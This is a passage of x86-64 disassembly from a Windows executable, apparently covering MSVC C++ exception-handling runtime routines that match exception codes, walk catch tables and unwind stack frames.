   1400048f5:	0f 11 02             	movups %xmm0,(%rdx)
   1400048f8:	e8 ef e3 ff ff       	call   0x140002cec
   1400048fd:	48 8d 05 4c 1f 01 00 	lea    0x11f4c(%rip),%rax        # 0x140016850
   140004904:	48 89 03             	mov    %rax,(%rbx)
   140004907:	48 8b c3             	mov    %rbx,%rax
   14000490a:	48 83 c4 20          	add    $0x20,%rsp
   14000490e:	5b                   	pop    %rbx
   14000490f:	c3                   	ret
   140004910:	48 8d 05 49 1f 01 00 	lea    0x11f49(%rip),%rax        # 0x140016860
   140004917:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000491e:	00 
   14000491f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140004923:	48 8d 05 26 1f 01 00 	lea    0x11f26(%rip),%rax        # 0x140016850
   14000492a:	48 89 01             	mov    %rax,(%rcx)
   14000492d:	48 8b c1             	mov    %rcx,%rax
   140004930:	c3                   	ret
   140004931:	cc                   	int3
   140004932:	cc                   	int3
   140004933:	cc                   	int3
   140004934:	40 53                	rex push %rbx
   140004936:	56                   	push   %rsi
   140004937:	57                   	push   %rdi
   140004938:	41 54                	push   %r12
   14000493a:	41 55                	push   %r13
   14000493c:	41 56                	push   %r14
   14000493e:	41 57                	push   %r15
   140004940:	48 83 ec 70          	sub    $0x70,%rsp
   140004944:	48 8b f9             	mov    %rcx,%rdi
   140004947:	45 33 ff             	xor    %r15d,%r15d
   14000494a:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   14000494f:	44 89 bc 24 b0 00 00 	mov    %r15d,0xb0(%rsp)
   140004956:	00 
   140004957:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   14000495c:	4c 89 bc 24 c8 00 00 	mov    %r15,0xc8(%rsp)
   140004963:	00 
   140004964:	e8 93 e5 ff ff       	call   0x140002efc
   140004969:	4c 8b 68 28          	mov    0x28(%rax),%r13
   14000496d:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   140004972:	e8 85 e5 ff ff       	call   0x140002efc
   140004977:	48 8b 40 20          	mov    0x20(%rax),%rax
   14000497b:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   140004982:	00 
   140004983:	48 8b 77 50          	mov    0x50(%rdi),%rsi
   140004987:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   14000498c:	48 89 b4 24 b8 00 00 	mov    %rsi,0xb8(%rsp)
   140004993:	00 
   140004994:	48 8b 47 48          	mov    0x48(%rdi),%rax
   140004998:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000499d:	48 8b 5f 40          	mov    0x40(%rdi),%rbx
   1400049a1:	48 8b 47 30          	mov    0x30(%rdi),%rax
   1400049a5:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400049aa:	4c 8b 77 28          	mov    0x28(%rdi),%r14
   1400049ae:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   1400049b3:	48 8b cb             	mov    %rbx,%rcx
   1400049b6:	e8 e9 e4 ff ff       	call   0x140002ea4
   1400049bb:	e8 3c e5 ff ff       	call   0x140002efc
   1400049c0:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1400049c4:	e8 33 e5 ff ff       	call   0x140002efc
   1400049c9:	48 89 58 28          	mov    %rbx,0x28(%rax)
   1400049cd:	e8 2a e5 ff ff       	call   0x140002efc
   1400049d2:	48 8b 50 20          	mov    0x20(%rax),%rdx
   1400049d6:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   1400049da:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400049df:	e8 3c ee ff ff       	call   0x140003820
   1400049e4:	4c 8b e0             	mov    %rax,%r12
   1400049e7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400049ec:	4c 39 7f 58          	cmp    %r15,0x58(%rdi)
   1400049f0:	74 1c                	je     0x140004a0e
   1400049f2:	c7 84 24 b0 00 00 00 	movl   $0x1,0xb0(%rsp)
   1400049f9:	01 00 00 00 
   1400049fd:	e8 fa e4 ff ff       	call   0x140002efc
   140004a02:	48 8b 48 70          	mov    0x70(%rax),%rcx
   140004a06:	48 89 8c 24 c8 00 00 	mov    %rcx,0xc8(%rsp)
   140004a0d:	00 
   140004a0e:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140004a14:	49 8b d6             	mov    %r14,%rdx
   140004a17:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140004a1c:	e8 8f 05 00 00       	call   0x140004fb0
   140004a21:	48 8b d8             	mov    %rax,%rbx
   140004a24:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004a29:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140004a30:	00 
   140004a31:	eb 6e                	jmp    0x140004aa1
   140004a33:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140004a3a:	00 
   140004a3b:	e8 bc e4 ff ff       	call   0x140002efc
   140004a40:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%rax)
   140004a47:	48 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%rcx
   140004a4e:	00 
   140004a4f:	83 bc 24 b0 00 00 00 	cmpl   $0x0,0xb0(%rsp)
   140004a56:	00 
   140004a57:	74 0f                	je     0x140004a68
   140004a59:	b2 01                	mov    $0x1,%dl
   140004a5b:	e8 24 e1 ff ff       	call   0x140002b84
   140004a60:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
   140004a67:	00 
   140004a68:	4c 8d 49 20          	lea    0x20(%rcx),%r9
   140004a6c:	44 8b 41 18          	mov    0x18(%rcx),%r8d
   140004a70:	8b 51 04             	mov    0x4(%rcx),%edx
   140004a73:	8b 09                	mov    (%rcx),%ecx
   140004a75:	ff 15 d5 06 01 00    	call   *0x106d5(%rip)        # 0x140015150
   140004a7b:	44 8b 7c 24 20       	mov    0x20(%rsp),%r15d
   140004a80:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140004a85:	4c 8b 6c 24 40       	mov    0x40(%rsp),%r13
   140004a8a:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140004a91:	00 
   140004a92:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   140004a97:	4c 8b 64 24 38       	mov    0x38(%rsp),%r12
   140004a9c:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004aa1:	49 8b cc             	mov    %r12,%rcx
   140004aa4:	e8 b3 ed ff ff       	call   0x14000385c
   140004aa9:	45 85 ff             	test   %r15d,%r15d
   140004aac:	75 39                	jne    0x140004ae7
   140004aae:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   140004ab4:	75 31                	jne    0x140004ae7
   140004ab6:	83 7e 18 04          	cmpl   $0x4,0x18(%rsi)
   140004aba:	75 2b                	jne    0x140004ae7
   140004abc:	8b 46 20             	mov    0x20(%rsi),%eax
   140004abf:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140004ac4:	74 0a                	je     0x140004ad0
   140004ac6:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140004acb:	83 f8 01             	cmp    $0x1,%eax
   140004ace:	77 17                	ja     0x140004ae7
   140004ad0:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   140004ad4:	e8 23 e1 ff ff       	call   0x140002bfc
   140004ad9:	85 c0                	test   %eax,%eax
   140004adb:	74 0a                	je     0x140004ae7
   140004add:	b2 01                	mov    $0x1,%dl
   140004adf:	48 8b ce             	mov    %rsi,%rcx
   140004ae2:	e8 9d e0 ff ff       	call   0x140002b84
   140004ae7:	e8 10 e4 ff ff       	call   0x140002efc
   140004aec:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004af0:	e8 07 e4 ff ff       	call   0x140002efc
   140004af5:	4c 89 68 28          	mov    %r13,0x28(%rax)
   140004af9:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140004afe:	48 63 48 1c          	movslq 0x1c(%rax),%rcx
   140004b02:	49 8b 06             	mov    (%r14),%rax
   140004b05:	48 c7 04 01 fe ff ff 	movq   $0xfffffffffffffffe,(%rcx,%rax,1)
   140004b0c:	ff 
   140004b0d:	48 8b c3             	mov    %rbx,%rax
   140004b10:	48 83 c4 70          	add    $0x70,%rsp
   140004b14:	41 5f                	pop    %r15
   140004b16:	41 5e                	pop    %r14
   140004b18:	41 5d                	pop    %r13
   140004b1a:	41 5c                	pop    %r12
   140004b1c:	5f                   	pop    %rdi
   140004b1d:	5e                   	pop    %rsi
   140004b1e:	5b                   	pop    %rbx
   140004b1f:	c3                   	ret
   140004b20:	40 53                	rex push %rbx
   140004b22:	48 83 ec 20          	sub    $0x20,%rsp
   140004b26:	4c 8b 09             	mov    (%rcx),%r9
   140004b29:	49 8b d8             	mov    %r8,%rbx
   140004b2c:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   140004b31:	41 c7 00 00 00 00 00 	movl   $0x0,(%r8)
   140004b38:	41 39 09             	cmp    %ecx,(%r9)
   140004b3b:	75 70                	jne    0x140004bad
   140004b3d:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   140004b42:	41 b8 20 05 93 19    	mov    $0x19930520,%r8d
   140004b48:	75 23                	jne    0x140004b6d
   140004b4a:	41 8b 41 20          	mov    0x20(%r9),%eax
   140004b4e:	41 3b c0             	cmp    %r8d,%eax
   140004b51:	74 0a                	je     0x140004b5d
   140004b53:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140004b58:	83 f8 01             	cmp    $0x1,%eax
   140004b5b:	77 10                	ja     0x140004b6d
   140004b5d:	48 8b 42 28          	mov    0x28(%rdx),%rax
   140004b61:	49 39 41 28          	cmp    %rax,0x28(%r9)
   140004b65:	75 06                	jne    0x140004b6d
   140004b67:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140004b6d:	41 39 09             	cmp    %ecx,(%r9)
   140004b70:	75 3b                	jne    0x140004bad
   140004b72:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   140004b77:	75 34                	jne    0x140004bad
   140004b79:	41 8b 49 20          	mov    0x20(%r9),%ecx
   140004b7d:	41 3b c8             	cmp    %r8d,%ecx
   140004b80:	74 0b                	je     0x140004b8d
   140004b82:	81 c1 df fa 6c e6    	add    $0xe66cfadf,%ecx
   140004b88:	83 f9 01             	cmp    $0x1,%ecx
   140004b8b:	77 20                	ja     0x140004bad
   140004b8d:	49 83 79 30 00       	cmpq   $0x0,0x30(%r9)
   140004b92:	75 19                	jne    0x140004bad
   140004b94:	e8 63 e3 ff ff       	call   0x140002efc
   140004b99:	c7 40 40 01 00 00 00 	movl   $0x1,0x40(%rax)
   140004ba0:	b8 01 00 00 00       	mov    $0x1,%eax
   140004ba5:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   140004bab:	eb 02                	jmp    0x140004baf
   140004bad:	33 c0                	xor    %eax,%eax
   140004baf:	48 83 c4 20          	add    $0x20,%rsp
   140004bb3:	5b                   	pop    %rbx
   140004bb4:	c3                   	ret
   140004bb5:	cc                   	int3
   140004bb6:	cc                   	int3
   140004bb7:	cc                   	int3
   140004bb8:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   140004bbd:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140004bc2:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004bc7:	53                   	push   %rbx
   140004bc8:	56                   	push   %rsi
   140004bc9:	57                   	push   %rdi
   140004bca:	41 54                	push   %r12
   140004bcc:	41 55                	push   %r13
   140004bce:	41 56                	push   %r14
   140004bd0:	41 57                	push   %r15
   140004bd2:	48 83 ec 30          	sub    $0x30,%rsp
   140004bd6:	45 8b e1             	mov    %r9d,%r12d
   140004bd9:	49 8b f0             	mov    %r8,%rsi
   140004bdc:	48 8b da             	mov    %rdx,%rbx
   140004bdf:	4c 8b f9             	mov    %rcx,%r15
   140004be2:	e8 c9 ec ff ff       	call   0x1400038b0
   140004be7:	4c 8b e8             	mov    %rax,%r13
   140004bea:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004bef:	4c 8b c6             	mov    %rsi,%r8
   140004bf2:	48 8b d3             	mov    %rbx,%rdx
   140004bf5:	49 8b cf             	mov    %r15,%rcx
   140004bf8:	e8 93 ed ff ff       	call   0x140003990
   140004bfd:	8b f8                	mov    %eax,%edi
   140004bff:	e8 f8 e2 ff ff       	call   0x140002efc
   140004c04:	ff 40 30             	incl   0x30(%rax)
   140004c07:	83 ff ff             	cmp    $0xffffffff,%edi
   140004c0a:	0f 84 ea 00 00 00    	je     0x140004cfa
   140004c10:	41 3b fc             	cmp    %r12d,%edi
   140004c13:	0f 8e e1 00 00 00    	jle    0x140004cfa
   140004c19:	83 ff ff             	cmp    $0xffffffff,%edi
   140004c1c:	0f 8e 13 01 00 00    	jle    0x140004d35
   140004c22:	3b 7e 04             	cmp    0x4(%rsi),%edi
   140004c25:	0f 8d 0a 01 00 00    	jge    0x140004d35
   140004c2b:	e8 80 ec ff ff       	call   0x1400038b0
   140004c30:	4c 63 f7             	movslq %edi,%r14
   140004c33:	49 c1 e6 03          	shl    $0x3,%r14
   140004c37:	48 63 4e 08          	movslq 0x8(%rsi),%rcx
   140004c3b:	49 03 ce             	add    %r14,%rcx
   140004c3e:	8b 3c 01             	mov    (%rcx,%rax,1),%edi
   140004c41:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140004c45:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   140004c49:	e8 62 ec ff ff       	call   0x1400038b0
   140004c4e:	49 03 c6             	add    %r14,%rax
   140004c51:	83 7c 18 04 00       	cmpl   $0x0,0x4(%rax,%rbx,1)
   140004c56:	74 1b                	je     0x140004c73
   140004c58:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   140004c5c:	e8 4f ec ff ff       	call   0x1400038b0
   140004c61:	49 03 c6             	add    %r14,%rax
   140004c64:	48 63 5c 18 04       	movslq 0x4(%rax,%rbx,1),%rbx
   140004c69:	e8 42 ec ff ff       	call   0x1400038b0
   140004c6e:	48 03 c3             	add    %rbx,%rax
   140004c71:	eb 02                	jmp    0x140004c75
   140004c73:	33 c0                	xor    %eax,%eax
   140004c75:	48 85 c0             	test   %rax,%rax
   140004c78:	74 57                	je     0x140004cd1
   140004c7a:	44 8b c7             	mov    %edi,%r8d
   140004c7d:	48 8b d6             	mov    %rsi,%rdx
   140004c80:	49 8b cf             	mov    %r15,%rcx
   140004c83:	e8 5c ed ff ff       	call   0x1400039e4
   140004c88:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   140004c8c:	e8 1f ec ff ff       	call   0x1400038b0
   140004c91:	49 03 c6             	add    %r14,%rax
   140004c94:	83 7c 18 04 00       	cmpl   $0x0,0x4(%rax,%rbx,1)
   140004c99:	74 1b                	je     0x140004cb6
   140004c9b:	48 63 5e 08          	movslq 0x8(%rsi),%rbx
   140004c9f:	e8 0c ec ff ff       	call   0x1400038b0
   140004ca4:	49 03 c6             	add    %r14,%rax
   140004ca7:	48 63 5c 18 04       	movslq 0x4(%rax,%rbx,1),%rbx
   140004cac:	e8 ff eb ff ff       	call   0x1400038b0
   140004cb1:	48 03 c3             	add    %rbx,%rax
   140004cb4:	eb 02                	jmp    0x140004cb8
   140004cb6:	33 c0                	xor    %eax,%eax
   140004cb8:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   140004cbe:	49 8b d7             	mov    %r15,%rdx
   140004cc1:	48 8b c8             	mov    %rax,%rcx
   140004cc4:	e8 e7 02 00 00       	call   0x140004fb0
   140004cc9:	49 8b cd             	mov    %r13,%rcx
   140004ccc:	e8 07 ec ff ff       	call   0x1400038d8
   140004cd1:	eb 1e                	jmp    0x140004cf1
   140004cd3:	44 8b a4 24 88 00 00 	mov    0x88(%rsp),%r12d
   140004cda:	00 
   140004cdb:	48 8b b4 24 80 00 00 	mov    0x80(%rsp),%rsi
   140004ce2:	00 
   140004ce3:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140004ce8:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
   140004ced:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   140004cf1:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   140004cf5:	e9 0d ff ff ff       	jmp    0x140004c07
   140004cfa:	e8 fd e1 ff ff       	call   0x140002efc
   140004cff:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140004d03:	7e 08                	jle    0x140004d0d
   140004d05:	e8 f2 e1 ff ff       	call   0x140002efc
   140004d0a:	ff 48 30             	decl   0x30(%rax)
   140004d0d:	83 ff ff             	cmp    $0xffffffff,%edi
   140004d10:	74 05                	je     0x140004d17
   140004d12:	41 3b fc             	cmp    %r12d,%edi
   140004d15:	7f 24                	jg     0x140004d3b
   140004d17:	44 8b c7             	mov    %edi,%r8d
   140004d1a:	48 8b d6             	mov    %rsi,%rdx
   140004d1d:	49 8b cf             	mov    %r15,%rcx
   140004d20:	e8 bf ec ff ff       	call   0x1400039e4
   140004d25:	48 83 c4 30          	add    $0x30,%rsp
   140004d29:	41 5f                	pop    %r15
   140004d2b:	41 5e                	pop    %r14
   140004d2d:	41 5d                	pop    %r13
   140004d2f:	41 5c                	pop    %r12
   140004d31:	5f                   	pop    %rdi
   140004d32:	5e                   	pop    %rsi
   140004d33:	5b                   	pop    %rbx
   140004d34:	c3                   	ret
   140004d35:	e8 b6 42 00 00       	call   0x140008ff0
   140004d3a:	90                   	nop
   140004d3b:	e8 b0 42 00 00       	call   0x140008ff0
   140004d40:	90                   	nop
   140004d41:	cc                   	int3
   140004d42:	cc                   	int3
   140004d43:	cc                   	int3
   140004d44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004d49:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004d4e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004d53:	57                   	push   %rdi
   140004d54:	48 83 ec 20          	sub    $0x20,%rsp
   140004d58:	48 8b e9             	mov    %rcx,%rbp
   140004d5b:	49 8b f8             	mov    %r8,%rdi
   140004d5e:	49 8b c8             	mov    %r8,%rcx
   140004d61:	48 8b f2             	mov    %rdx,%rsi
   140004d64:	e8 c3 ec ff ff       	call   0x140003a2c
   140004d69:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140004d6e:	4c 8b c7             	mov    %rdi,%r8
   140004d71:	48 8b d6             	mov    %rsi,%rdx
   140004d74:	48 8b cd             	mov    %rbp,%rcx
   140004d77:	8b d8                	mov    %eax,%ebx
   140004d79:	e8 7e e7 ff ff       	call   0x1400034fc
   140004d7e:	4c 8b c7             	mov    %rdi,%r8
   140004d81:	48 8b d6             	mov    %rsi,%rdx
   140004d84:	48 8b cd             	mov    %rbp,%rcx
   140004d87:	e8 2c ec ff ff       	call   0x1400039b8
   140004d8c:	3b d8                	cmp    %eax,%ebx
   140004d8e:	7e 23                	jle    0x140004db3
   140004d90:	44 8b c3             	mov    %ebx,%r8d
   140004d93:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004d98:	48 8b d7             	mov    %rdi,%rdx
   140004d9b:	e8 44 ec ff ff       	call   0x1400039e4
   140004da0:	44 8b cb             	mov    %ebx,%r9d
   140004da3:	4c 8b c7             	mov    %rdi,%r8
   140004da6:	48 8b d6             	mov    %rsi,%rdx
   140004da9:	48 8b cd             	mov    %rbp,%rcx
   140004dac:	e8 3f ec ff ff       	call   0x1400039f0
   140004db1:	eb 10                	jmp    0x140004dc3
   140004db3:	4c 8b c7             	mov    %rdi,%r8
   140004db6:	48 8b d6             	mov    %rsi,%rdx
   140004db9:	48 8b cd             	mov    %rbp,%rcx
   140004dbc:	e8 f7 eb ff ff       	call   0x1400039b8
   140004dc1:	8b d8                	mov    %eax,%ebx
   140004dc3:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004dc8:	8b c3                	mov    %ebx,%eax
   140004dca:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004dcf:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004dd4:	48 83 c4 20          	add    $0x20,%rsp
   140004dd8:	5f                   	pop    %rdi
   140004dd9:	c3                   	ret
   140004dda:	cc                   	int3
   140004ddb:	cc                   	int3
   140004ddc:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004de1:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004de6:	55                   	push   %rbp
   140004de7:	56                   	push   %rsi
   140004de8:	57                   	push   %rdi
   140004de9:	41 54                	push   %r12
   140004deb:	41 55                	push   %r13
   140004ded:	41 56                	push   %r14
   140004def:	41 57                	push   %r15
   140004df1:	48 83 ec 20          	sub    $0x20,%rsp
   140004df5:	4c 8b f2             	mov    %rdx,%r14
   140004df8:	48 8b f1             	mov    %rcx,%rsi
   140004dfb:	48 85 d2             	test   %rdx,%rdx
   140004dfe:	0f 84 b9 00 00 00    	je     0x140004ebd
   140004e04:	45 32 e4             	xor    %r12b,%r12b
   140004e07:	33 ed                	xor    %ebp,%ebp
   140004e09:	39 2a                	cmp    %ebp,(%rdx)
   140004e0b:	0f 8e 94 00 00 00    	jle    0x140004ea5
   140004e11:	48 8b 46 30          	mov    0x30(%rsi),%rax
   140004e15:	48 63 78 0c          	movslq 0xc(%rax),%rdi
   140004e19:	e8 a6 ea ff ff       	call   0x1400038c4
   140004e1e:	48 83 c0 04          	add    $0x4,%rax
   140004e22:	48 03 f8             	add    %rax,%rdi
   140004e25:	48 8b 46 30          	mov    0x30(%rsi),%rax
   140004e29:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140004e2e:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   140004e32:	e8 8d ea ff ff       	call   0x1400038c4
   140004e37:	44 8b 3c 18          	mov    (%rax,%rbx,1),%r15d
   140004e3b:	45 85 ff             	test   %r15d,%r15d
   140004e3e:	7e 5a                	jle    0x140004e9a
   140004e40:	48 63 c5             	movslq %ebp,%rax
   140004e43:	4c 8d 2c 80          	lea    (%rax,%rax,4),%r13
   140004e47:	48 63 37             	movslq (%rdi),%rsi
   140004e4a:	e8 75 ea ff ff       	call   0x1400038c4
   140004e4f:	49 63 5e 04          	movslq 0x4(%r14),%rbx
   140004e53:	48 03 f0             	add    %rax,%rsi
   140004e56:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140004e5b:	48 8b 78 30          	mov    0x30(%rax),%rdi
   140004e5f:	e8 4c ea ff ff       	call   0x1400038b0
   140004e64:	4c 8b c7             	mov    %rdi,%r8
   140004e67:	48 8b d6             	mov    %rsi,%rdx
   140004e6a:	4a 8d 0c a8          	lea    (%rax,%r13,4),%rcx
   140004e6e:	48 03 cb             	add    %rbx,%rcx
   140004e71:	e8 06 f7 ff ff       	call   0x14000457c
   140004e76:	85 c0                	test   %eax,%eax
   140004e78:	75 18                	jne    0x140004e92
   140004e7a:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140004e7f:	41 ff cf             	dec    %r15d
   140004e82:	48 83 c7 04          	add    $0x4,%rdi
   140004e86:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140004e8b:	45 85 ff             	test   %r15d,%r15d
   140004e8e:	7f b7                	jg     0x140004e47
   140004e90:	eb 03                	jmp    0x140004e95
   140004e92:	41 b4 01             	mov    $0x1,%r12b
   140004e95:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004e9a:	ff c5                	inc    %ebp
   140004e9c:	41 3b 2e             	cmp    (%r14),%ebp
   140004e9f:	0f 8c 6c ff ff ff    	jl     0x140004e11
   140004ea5:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140004eaa:	41 8a c4             	mov    %r12b,%al
   140004ead:	48 83 c4 20          	add    $0x20,%rsp
   140004eb1:	41 5f                	pop    %r15
   140004eb3:	41 5e                	pop    %r14
   140004eb5:	41 5d                	pop    %r13
   140004eb7:	41 5c                	pop    %r12
   140004eb9:	5f                   	pop    %rdi
   140004eba:	5e                   	pop    %rsi
   140004ebb:	5d                   	pop    %rbp
   140004ebc:	c3                   	ret
   140004ebd:	e8 2e 41 00 00       	call   0x140008ff0
   140004ec2:	cc                   	int3
   140004ec3:	cc                   	int3
   140004ec4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ec9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004ece:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004ed3:	57                   	push   %rdi
   140004ed4:	48 83 ec 20          	sub    $0x20,%rsp
   140004ed8:	33 ed                	xor    %ebp,%ebp
   140004eda:	48 8b f9             	mov    %rcx,%rdi
   140004edd:	39 29                	cmp    %ebp,(%rcx)
   140004edf:	7e 50                	jle    0x140004f31
   140004ee1:	33 f6                	xor    %esi,%esi
   140004ee3:	48 63 5f 04          	movslq 0x4(%rdi),%rbx
   140004ee7:	e8 c4 e9 ff ff       	call   0x1400038b0
   140004eec:	48 03 c6             	add    %rsi,%rax
   140004eef:	83 7c 18 04 00       	cmpl   $0x0,0x4(%rax,%rbx,1)
   140004ef4:	74 1b                	je     0x140004f11
   140004ef6:	48 63 5f 04          	movslq 0x4(%rdi),%rbx
   140004efa:	e8 b1 e9 ff ff       	call   0x1400038b0
   140004eff:	48 03 c6             	add    %rsi,%rax
   140004f02:	48 63 5c 18 04       	movslq 0x4(%rax,%rbx,1),%rbx
   140004f07:	e8 a4 e9 ff ff       	call   0x1400038b0
   140004f0c:	48 03 c3             	add    %rbx,%rax
